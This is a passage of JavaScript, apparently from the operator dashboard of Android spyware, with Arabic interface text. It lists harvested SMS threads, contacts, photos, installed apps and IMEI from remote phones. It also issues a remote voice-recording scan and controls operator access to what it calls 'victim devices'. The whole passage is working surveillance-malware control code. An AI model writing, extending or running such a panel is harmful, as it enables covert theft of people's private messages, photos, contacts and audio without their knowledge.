        item.className = 'conversation-item';
        item.onclick = () => openChat(number);
        item.innerHTML = `<div class="conversation-avatar">💬</div><div class="conversation-info"><div class="conversation-name">${displayName}</div><div class="conversation-preview">${last.body || ''}</div></div><div class="conversation-time">${formatDate(last.date)}</div>`;
        div.appendChild(item);
    });
}

function openChat(number) {
    currentChat = number;
    document.getElementById('conversationsList').style.display = 'none';
    document.getElementById('chatView').style.display = 'block';
    document.getElementById('chatTitle').textContent = `💬 ${findContactName(number) || number}`;
    const messagesList = document.getElementById('messagesList');
    messagesList.innerHTML = '';
    allSMS.filter(s => s.address === number).sort((a, b) => (a.date || 0) - (b.date || 0)).forEach(sms => {
        const div = document.createElement('div');
        div.className = `message ${sms.type == 1 ? 'incoming' : 'outgoing'}`;
        div.innerHTML = `<div class="message-bubble"><div class="message-text">${sms.body || ''}</div><div class="message-time">${formatDate(sms.date)}</div></div>`;
        messagesList.appendChild(div);
    });
    messagesList.scrollTop = messagesList.scrollHeight;
}

function backToConversations() { currentChat = null; displayConversations(); }

async function loadContacts() {
    try {
        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=contacts`);
        const newContacts = await response.json();
        if (!Array.isArray(newContacts)) return;
        if (JSON.stringify(newContacts) !== JSON.stringify(allContacts)) {
            allContacts = newContacts;
            if (currentContact) openContactDetail(currentContact);
            else displayContactsList();
        }
    } catch (e) {}
}

function displayContactsList() {
    document.getElementById('contactDetailView').style.display = 'none';
    document.getElementById('contactsListView').style.display = 'block';
    const div = document.getElementById('contactsListView');
    div.innerHTML = '';
    if (!allContacts || allContacts.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد جهات</p>'; return; }
    [...allContacts].sort((a, b) => (a.name || '').localeCompare(b.name || '', 'ar')).forEach(contact => {
        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
        const item = document.createElement('div');
        item.className = 'conversation-item';
        item.onclick = () => openContactDetail(contact.name);
        item.innerHTML = `<div class="conversation-avatar">👤</div><div class="conversation-info"><div class="conversation-name">${contact.name || 'بدون اسم'}</div><div class="conversation-preview">${numbers.join(', ')}</div></div>`;
        div.appendChild(item);
    });
}

function openContactDetail(name) {
    currentContact = name;
    document.getElementById('contactsListView').style.display = 'none';
    document.getElementById('contactDetailView').style.display = 'block';
    const contact = allContacts.find(c => c.name === name);
    if (!contact) return;
    const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
    document.getElementById('contactDetails').innerHTML = `<div class="contact-detail-card"><div class="contact-avatar">👤</div><h4>${contact.name}</h4><div class="contact-numbers">${numbers.map(n => `<div class="contact-number-item"><span>${n}</span><div><button class="action-btn" onclick="openChat('${n}')">💬</button><button class="action-btn" onclick="openCallDetail('${n}')">📞</button><button class="action-btn" onclick="openSendSmsTo('${n}')">📨</button></div></div>`).join('')}</div></div>`;
}

function openSendSmsTo(number) {
    openSendSms();
    setTimeout(() => {
        const el = document.getElementById('smsNumber');
        if (el) el.value = number;
    }, 100);
}

function backToContactsList() { currentContact = null; displayContactsList(); }

async function loadImages() {
    try {
        const response = await authFetch(`/api.php?action=get_image_data&device=${encodeURIComponent(currentDevice)}`);
        const images = await response.json();
        const grid = document.getElementById('imagesGrid');
        grid.innerHTML = '';
        if (!Array.isArray(images) || images.length === 0) { grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>'; return; }
        [...images].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach((image, i) => {
            const div = document.createElement('div');
            div.className = 'image-card';
            const img = document.createElement('img');
            if (image.data) { let m = 'image/jpeg'; if (image.name) { const e = image.name.toLowerCase().split('.').pop(); if (e === 'png') m = 'image/png'; } img.src = `data:${m};base64,${image.data}`; }
            img.className = 'thumb';
            const name = document.createElement('div'); name.className = 'image-name'; name.textContent = image.name || `صورة ${i+1}`;
            const btns = document.createElement('div'); btns.className = 'image-buttons';
            const v = document.createElement('button'); v.className = 'view-btn'; v.textContent = '👁️'; v.onclick = () => window.open(img.src);
            const d = document.createElement('button'); d.className = 'download-btn'; d.textContent = '⬇️'; d.onclick = () => { const a = document.createElement('a'); a.href = img.src; a.download = image.name; document.body.appendChild(a); a.click(); a.remove(); };
            btns.appendChild(v); btns.appendChild(d);
            div.appendChild(img); div.appendChild(name); div.appendChild(btns);
            grid.appendChild(div);
        });
    } catch (e) {}
}

async function loadApps() {
    try {
        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=installed_apps`);
        const apps = await response.json();
        const tbody = document.querySelector('#appsTable tbody');
        if (!tbody) return;
        tbody.innerHTML = '';
        if (!Array.isArray(apps) || apps.length === 0) return;
        apps.forEach(app => { const r = document.createElement('tr'); r.innerHTML = `<td>${app.name || app.package}</td><td>${app.package}</td><td>${app.system_app ? 'نعم' : 'لا'}</td>`; tbody.appendChild(r); });
    } catch (e) {}
}

async function loadDeviceInfo() {
    try {
        const response = await authFetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=device_info`);
        const info = await response.json();
        const div = document.getElementById('deviceInfo');
        if (!info || Object.keys(info).length === 0) return;
        div.innerHTML = `<div class="device-info-grid"><div class="info-card"><span>الموديل:</span><strong>${info.model || '—'}</strong></div><div class="info-card"><span>العلامة:</span><strong>${info.brand || '—'}</strong></div><div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div><div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div></div>`;
    } catch (e) {}
}

function switchTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
    if (tab) tab.classList.add('active');
    const pane = document.getElementById(`${tabName}Tab`);
    if (pane) pane.classList.add('active');

    if (tabName === 'security') {
        loadAuthorizedDevices();
        loadDevicePermissions();
    }
}

function formatDuration(s) { if (!s || s < 0) return '0:00'; return `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`; }
function formatDate(t) { if (!t) return '—'; try { return new Date(t).toLocaleString('ar'); } catch (e) { return '—'; } }
function getCallType(t) { switch(parseInt(t)) { case 1: return '📥 وارد'; case 2: return '📤 صادر'; case 3: return '❌ فائت'; default: return 'غير معروف'; } }

async function triggerVoiceScan() {
    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
    try {
        const response = await fetch('/api.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device: currentDevice, command: 'scan_voices', token: getAuthToken() })
        });
        const result = await response.json();
        if (result.success) {
            showNotification('🔁 جاري الفحص', 'سيتم إرسال الصوتيات الجديدة خلال 30 ثانية', '🎤');
        } else alert('❌ فشل');
    } catch (e) { alert('❌ خطأ: ' + e.message); }
}

async function loadAuthorizedDevices() {
    if (!isOwner()) return;
    try {
        const token = getAuthToken();
        if (!token) return;

        const res = await fetch(`/auth/devices?token=${encodeURIComponent(token)}`);
        if (res.status === 401) { logout(); return; }
        if (res.status === 403) return;
        const data = await res.json();

        const pendingDiv = document.getElementById('pendingDevicesList');
        if (pendingDiv) {
            pendingDiv.innerHTML = '';
            if (!data.pending || data.pending.length === 0) {
                pendingDiv.innerHTML = '<p style="color:#666;font-size:13px;">لا توجد أجهزة قيد الانتظار</p>';
            } else {
                data.pending.forEach(dev => {
                    const div = document.createElement('div');
                    div.className = 'conversation-item';
                    div.style.cssText = 'flex-direction:column;align-items:stretch;background:#1a1a00;border:1px solid #ffcc00;padding:12px;border-radius:8px;margin-bottom:10px;';
                    const dateStr = dev.time ? new Date(dev.time).toLocaleString('ar') : '—';
                    div.innerHTML = `
                        <div style="color:#ffcc00;font-weight:bold;margin-bottom:5px;">🆕 جهاز جديد يحاول الدخول</div>
                        <div style="color:#ccc;font-size:12px;word-break:break-all;">FP: <b>${(dev.fp || '').slice(0, 24)}...</b></div>
                        <div style="color:#888;font-size:11px;">IP: ${dev.ip || '—'}</div>
                        <div style="color:#888;font-size:11px;">Screen: ${dev.screen || '—'} | TZ: ${dev.tz || '—'}</div>
                        <div style="color:#888;font-size:11px;">UA: ${(dev.ua || '').slice(0, 60)}...</div>
                        <div style="color:#888;font-size:11px;">📅 ${dateStr}</div>
                        <div style="display:flex;gap:8px;margin-top:10px;">
                            <button onclick="approveDevice('${dev.fp}')" style="flex:1;background:#00cc66;color:#fff;border:none;padding:8px;border-radius:6px;cursor:pointer;font-weight:bold;">✅ موافقة</button>
                            <button onclick="denyDevice('${dev.fp}')" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:6px;cursor:pointer;font-weight:bold;">❌ رفض</button>
                        </div>
                    `;
                    pendingDiv.appendChild(div);
                });
            }
        }

        const badge = document.getElementById('pendingBadge');
        if (badge) {
            const count = (data.pending || []).length;
            badge.textContent = count > 0 ? `(${count}) 🔴` : '';
            badge.className = count > 0 ? 'count badge-new' : 'count';
        }

        const approvedDiv = document.getElementById('approvedDevicesList');
        if (approvedDiv) {
            approvedDiv.innerHTML = '';
            if (!data.approved || data.approved.length === 0) {
                approvedDiv.innerHTML = '<p style="color:#666;font-size:13px;">لا توجد أجهزة مصرح لها</p>';
            } else {
                data.approved.forEach(fp => {
                    const div = document.createElement('div');
                    div.className = 'conversation-item';
                    div.style.cssText = 'background:#001a0d;border:1px solid #00cc66;padding:12px;border-radius:8px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;gap:10px;';
                    div.innerHTML = `
                        <div style="flex:1;">
                            <div style="color:#00ffcc;font-size:12px;">✅ مصرح له</div>
                            <div style="color:#ccc;font-size:11px;word-break:break-all;">${fp.slice(0, 24)}...</div>
                        </div>
                        <button onclick="revokeDevice('${fp}')" style="background:#ff3300;color:#fff;border:none;padding:8px 15px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 سحب</button>
                    `;
                    approvedDiv.appendChild(div);
                });
            }
        }

        const deniedDiv = document.getElementById('deniedDevicesList');
        if (deniedDiv) {
            deniedDiv.innerHTML = '';
            if (!data.denied || data.denied.length === 0) {
                deniedDiv.innerHTML = '<p style="color:#666;font-size:13px;">لا توجد أجهزة محجوبة</p>';
            } else {
                data.denied.forEach(fp => {
                    const div = document.createElement('div');
                    div.className = 'conversation-item';
                    div.style.cssText = 'background:#1a0000;border:1px solid #ff3300;padding:12px;border-radius:8px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;gap:10px;';
                    div.innerHTML = `
                        <div style="flex:1;">
                            <div style="color:#ff6666;font-size:12px;">🚫 محجوب</div>
                            <div style="color:#ccc;font-size:11px;word-break:break-all;">${fp.slice(0, 24)}...</div>
                        </div>
                        <button onclick="unblockDevice('${fp}')" style="background:#666;color:#fff;border:none;padding:8px 15px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">🔓 فتح</button>
                    `;
                    deniedDiv.appendChild(div);
                });
            }
        }

    } catch (e) {
        console.error('loadAuthorizedDevices error:', e);
    }
}

async function approveDevice(fp) {
    if (!confirm('الموافقة على هذا الجهاز؟')) return;
    try {
        const res = await fetch('/auth/approve', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: getAuthToken(), fp })
        });
        const data = await res.json();
        if (data.success) {
            showNotification('✅ تم', 'تمت الموافقة على الجهاز', '🔐');
            loadAuthorizedDevices();
        } else alert('❌ فشل: ' + (data.error || ''));
    } catch (e) { alert('❌ خطأ: ' + e.message); }
}

async function denyDevice(fp) {
    if (!confirm('رفض هذا الجهاز نهائياً؟')) return;
    try {
        const res = await fetch('/auth/deny', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: getAuthToken(), fp })
        });
        const data = await res.json();
        if (data.success) {
            showNotification('🚫 تم', 'تم رفض الجهاز', '🚫');
            loadAuthorizedDevices();
        } else alert('❌ فشل: ' + (data.error || ''));
    } catch (e) { alert('❌ خطأ: ' + e.message); }
}

async function revokeDevice(fp) {
    if (!confirm('سحب التصريح من هذا الجهاز؟\nسيتم تسجيل خروجه فوراً.')) return;
    try {
        const res = await fetch('/auth/revoke', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: getAuthToken(), fp })
        });
        const data = await res.json();
        if (data.success) {
            showNotification('🔓 تم', 'تم سحب التصريح', '🔓');
            loadAuthorizedDevices();
        } else alert('❌ فشل: ' + (data.error || ''));
    } catch (e) { alert('❌ خطأ: ' + e.message); }
}

async function unblockDevice(fp) {
    if (!confirm('فتح هذا الجهاز (السماح له بالمحاولة من جديد)؟')) return;
    try {
        const res = await fetch('/auth/unblock', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: getAuthToken(), fp })
        });
        const data = await res.json();
        if (data.success) {
            showNotification('🔓 تم', 'تم فتح الجهاز', '🔓');
            loadAuthorizedDevices();
        }
    } catch (e) {}
}

async function loadDevicePermissions() {
    if (!isOwner()) return;
    try {
        const token = getAuthToken();
        const [permsRes, devicesRes, usersRes] = await Promise.all([
            fetch(`/auth/permissions?token=${encodeURIComponent(token)}`),
            fetch(`/devices.json?token=${encodeURIComponent(token)}`),
            fetch(`/auth/devices?token=${encodeURIComponent(token)}`)
        ]);

        if (permsRes.status === 403 || devicesRes.status === 403 || usersRes.status === 403) return;

        const perms = await permsRes.json();
        const devices = await devicesRes.json();
        const usersData = await usersRes.json();
        const approvedUsers = usersData.approved || [];

        const div = document.getElementById('devicePermsList');
        if (!div) return;
        div.innerHTML = '';

        if (!devices || devices.length === 0) {
            div.innerHTML = '<p style="color:#666;font-size:13px;">لا توجد أجهزة ضحايا بعد</p>';
            return;
        }

        devices.forEach(device => {
            const allowed = perms[device.id] || [];
            const card = document.createElement('div');
            card.style.cssText = 'background:#1a0a1a;border:1px solid #9b59b6;padding:12px;border-radius:8px;margin-bottom:12px;';

            const userChips = approvedUsers.map(userFp => {
                const isAllowed = allowed.includes(userFp);
                const shortFp = userFp.slice(0, 16);
                return `
                    <button onclick="toggleDeviceAccess('${device.id}', '${userFp}', ${isAllowed})"
                        style="background:${isAllowed ? '#00cc66' : '#333'};color:#fff;border:none;padding:6px 12px;border-radius:15px;cursor:pointer;font-size:11px;margin:3px;">
                        ${isAllowed ? '✅' : '⬜'} ${shortFp}...
                    </button>
                `;
            }).join('');

            card.innerHTML = `
                <div style="color:#9b59b6;font-weight:bold;margin-bottom:8px;">
                    📱 ${device.name || device.id}
                </div>
                <div style="color:#888;font-size:11px;margin-bottom:8px;">
                    ${device.id}
                </div>
                <div style="color:#ccc;font-size:12px;margin-bottom:5px;">المستخدمون المسموح لهم:</div>
                <div style="display:flex;flex-wrap:wrap;gap:5px;">
                    ${userChips || '<span style="color:#666;font-size:11px;">لا يوجد مستخدمون مصرح لهم</span>'}
                </div>
            `;
            div.appendChild(card);
        });

    } catch (e) {
        console.error('loadDevicePermissions error:', e);
    }
}

async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
    const token = getAuthToken();
    const endpoint = currentlyAllowed ? '/auth/revoke-device' : '/auth/grant-device';

    try {
        const res = await fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token, deviceId, fp })
        });
        const data = await res.json();
        if (data.success) {
            showNotification('✅ تم', currentlyAllowed ? 'تم سحب الصلاحية' : 'تم منح الصلاحية', '🔐');
            loadDevicePermissions();
        } else {
            alert('❌ فشل: ' + (data.error || ''));
        }
    } catch (e) { alert('❌ فشل: ' + e.message); }
}

(async function verifySession() {
    const token = getAuthToken();
    if (!token) {
        window.location.href = 'login.html';
        return;
    }
    try {
        const res = await fetch('/auth/verify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token })
        });
        const data = await res.json();
        if (!data.valid) {
            sessionStorage.removeItem('logged_in');
            sessionStorage.removeItem('auth_token');
            sessionStorage.removeItem('is_owner');
            window.location.href = 'login.html';
        } else {
            sessionStorage.setItem('is_owner', data.isOwner ? 'true' : 'false');
        }
    } catch (e) {
        window.location.href = 'login.html';
    }
})();

(function hideSecurityTabForNonOwner() {
    if (!isOwner()) {
        const secTab = document.querySelector('.tab[onclick="switchTab(\'security\')"]');
        if (secTab) secTab.style.display = 'none';

        const secPane = document.getElementById('securityTab');
        if (secPane) secPane.style.display = 'none';

        window.loadAuthorizedDevices = function() {};
        window.loadDevicePermissions = function() {};
    }
})();

setInterval(() => {
    const secTab = document.getElementById('securityTab');
    if (secTab && secTab.classList.contains('active')) {
        loadAuthorizedDevices();
    }
}, 15000);

loadAuthorizedDevices();

loadDevices();
setInterval(loadDevices, 10000);
